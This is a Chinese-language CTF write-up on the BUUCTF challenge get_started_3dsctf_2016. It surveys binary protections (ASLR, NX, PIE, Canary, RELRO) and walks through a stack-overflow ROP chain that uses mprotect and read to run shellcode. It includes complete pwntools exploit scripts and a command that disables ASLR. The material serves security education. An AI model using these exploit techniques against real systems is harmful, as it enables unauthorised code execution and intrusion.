
    修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.
    mprotect函数:
    int mprotect(void *addr, size_t len, int prot);
    addr 内存启始地址
    len  修改内存的长度
    prot 内存的权限

这里用buuctf题目get_started_3dsctf_2016  
一个很简单的栈溢出

![1616056788_605311d4d8ab73e33c98c.png!small](https://image.3001.net/images/20210318/1616056788_605311d4d8ab73e33c98c.png!small)

开启了NX

![1616056798_605311de7698ddde7e4cf.png!small](https://image.3001.net/images/20210318/1616056798_605311de7698ddde7e4cf.png!small)
**顺便介绍一下各种保护**

## 一、ASLR

ASLR 的是操作系统的功能选项，作用于 executable（ELF）装入内存运行时，因而只能随机化 stack、heap、libraries
的基址。开启后每次加载程序的 stack、libarys、heap 等地址都会随机化

未开启：无作用  
半开启：随机化 stack 和 libarys  
全开启：随机化 stack、libarys 和 heap

## 二、NX

No-Execute（不可执行），Nx
的原理是将数据所在内存页标识为不可执行，当程序执行流被劫持到栈上时，程序会尝试在数据页面上执行指令，因为数据页被标记为不可知性，此时CPU就会抛出异常，而不是去执行栈上数据。

### 工作原理：

![1616057042_605312d29b6c6eebf85f3.jpg!small](https://image.3001.net/images/20210318/1616057042_605312d29b6c6eebf85f3.jpg!small)

在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。  
NX disabled：栈可以执行，栈上的数据也可以被当作代码执行。  
NX enabled：栈不可执行，栈上的数据程序只认为是数据，如果去执行的话会发生错误。即栈上的数据不可以被当作代码执行。

## 三、PIE

PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE /
-fpie），作用于编译过程，可将其理解为特殊的 PIC（so专用，Position Independent Code），加了 PIE 选项编译出来的
ELF 用 file 命令查看会显示其为 so，其随机化了 ELF 装载内存的基址（代码段、plt、got、data 等共同的基址）。其效果为用
objdump、IDA 反汇编之后的地址是用偏移表示的而不是绝对地址。

No PIE：无作用  
PIE enabled：代码段、plt、got、data 等共同的基址会随机化。在编译后的程序中，只保留指令、数据等的偏移，而不是绝对地址的形式。

一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。

内存地址随机化机制（address space layout randomization)，有以下三种情况

    
    
    0 - 表示关闭进程地址空间随机化。 
    1 - 表示将mmap的基址，stack和vdso页面随机化。
    2 - 表示在1的基础上增加栈（heap）的随机化。

可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。  
Built as PIE：位置独立的可执行区域（position-independent
executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented
programming）方法变得难得多。

liunx下关闭PIE的命令如下：

    
    
    sudo -s echo 0 > /proc/sys/kernel/randomize_va_space

## 四、Canary

金丝雀保护，开启这个保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie
信息是否合法，如果不合法就停止程序运行。真正的 cookie 信息也会保存在程序的某个位置。插入栈中的 cookie 一般在 ebp / rbp
之上的一个内存单元保存。

![1616057178_6053135a116d821b8df48.jpg!small](https://image.3001.net/images/20210318/1616057178_6053135a116d821b8df48.jpg!small)

无 Canary 保护：无任何作用  
部分函数 Canary 保护：在一些容易受到攻击的函数返回地址之前添加 cookie 。在函数返回时，检查该 cookie 与原本程序插入该位置的
cookie 是否一致，若一致则程序认为没有受到栈溢出攻击。  
全部函数 Canary 保护：所有的自定义函数在返回地址之前都会添加 cookie 。在函数返回时，检查该 cookie 与原本程序插入该位置的
cookie 是否一致，若一致则程序认为没有受到栈溢出攻击。

## 五、RELRO

设置符号重定位表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。

No RELRO：在这种模式下关于重定位并不进行任何保护。  
Partial RELRO：在这种模式下，一些段 (包括.dynamic) 在初始化后将会被标识为只读。  
Full RELRO：在这种模式下，除了会开启部分保护外。惰性解析会被禁用（所有的导入符号将在开始时被解析，.got.plt
段会被完全初始化为目标函数的终地址，并被标记为只读）。此外，既然惰性解析被禁用，GOT[1] 与 GOT[2] 条目将不会被初始化为提到的值。

有后门函数，但是远程打不通

    
    
    from pwn import *
    context.log_level = 'debug'
    elf = ELF('./get_started_3dsctf_2016')
    sh = elf.process()
    printf_addr = 0x0804F0E0
    main = 0x08048A20
    get_flag = 0x080489B8
    payload_01 = 'A' * 56 + p32(get_flag)
    sh.sendline(payload_01)
    sh.interactive()

远程打不通，但是发现了mprotec函数，所以可以选择通过mprotec函数修改内存权限写入shellcode

下个断点，运行

![1616058684_6053193c5f1abde21f28a.png!small](https://image.3001.net/images/20210318/1616058684_6053193c5f1abde21f28a.png!small)

查看一下内存

![1616058693_60531945c06896dabc710.png!small](https://image.3001.net/images/20210318/1616058693_60531945c06896dabc710.png!small)

0x80ea000-0x80ec000为rw-p权限，可以写入，gdb命令扩展：

    
    
    https://visualgdb.com/gdbreference/commands/x

本来是溢出到get_flag地址，现在栈溢出ret 到 mprotect函数地址

    
    
    payload = 'A'*0x38 + p32(mprotect_addr)

call 指令, call = push + jmp

所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在mprotect地址后在压入一个返回地址.  
在32为系统中使用栈传参，第一个参数先push，第二个再push....

    
    
    payload += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)

ret_addr 为 mprotect函数执行完后的地址.

> argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (vmmap得到)
>
> argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x0x80EB000-0x80ec000)
>
> argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)

为了后续再能使用ret，我们构造一下栈的布局，因为mprotect函数使用到了3个参数,就找存在3个连续pop的指令。在正常情况下，函数传参是使用push，所以要为了堆栈还原，函数调用结束时就使用pop来保证堆栈完好，所以需要三个pop

使用ROPgadget寻找合适的地址

    
    
    ROPgadget--binary get_started_3dsctf_2016 --only 'pop|ret' | grep pop

![1616058705_60531951d51336bdf743b.png!small](https://image.3001.net/images/20210318/1616058705_60531951d51336bdf743b.png!small)

0x0804f460即为上面的ret_addr的地址

而现在的payload就可以为:

    
    
    payload = 'A'*0x38 + p32(mprotect_addr)+p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)

定义执行完mprotect函数的返回地址即read的地址，我们也就可以再次利用ret来控制eip，将自己的shellcode写入内存再执行,使用read函数写入。

    
    
    read函数：
    ssize_t read(int fd, void *buf, size_t count);
    fd 设为0时就可以从输入端读取内容    设为0
    buf 设为我们想要执行的内存地址     设为我们已找到的内存地址0x80EB000
    size 适当大小就可以              设为0x100就可以了

> payload += p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32
> (0x100)

read函数跟mprotect一样，call = push + jmp.  
read_addr
后面跟执行完read函数后的返回地址。再次使用pop3_ret弹掉3个已用的参数,接着还可以利用ret来控制eip跳转到mem_addr即修改内存的地址执行自己的shellcode,
payload如下：

    
    
    payload = 'A' *0x38 + p32(mprotect_addr)+p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)+p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)+p32(mem_addr)

在执行read函数时就可以输入shellcode

    
    
    # _*_ coding:utf-8 _*_
    from pwn import *
    elf = ELF('./get_started_3dsctf_2016')
    sh = elf.process()
    sh = remote('node3.buuoj.cn', 28624)
    pop3_addr = 0x804951D
    mem_addr = 0x80EB000 #可读可写的内存,但不可执行
    mem_size = 0x1000    #通过调试出来的值
    mem_proc = 0x7       #可代表可读可写可执行
    mprotect_addr = elf.symbols['mprotect']
    read_addr = elf.symbols['read']
    payload = 'A'*0x38 + p32(mprotect_addr)+p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)+p32(read_addr) + p32(pop3_addr) + p32(0x0) + p32(mem_addr) +p32 (0x100)+p32(mem_addr)
    sh.sendline(payload)
    payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') 
    sh.sendline(payload_sh)
    sh.interactive()

![1616058717_6053195dea8344f3e9cb3.png!small](https://image.3001.net/images/20210318/1616058717_6053195dea8344f3e9cb3.png!small)

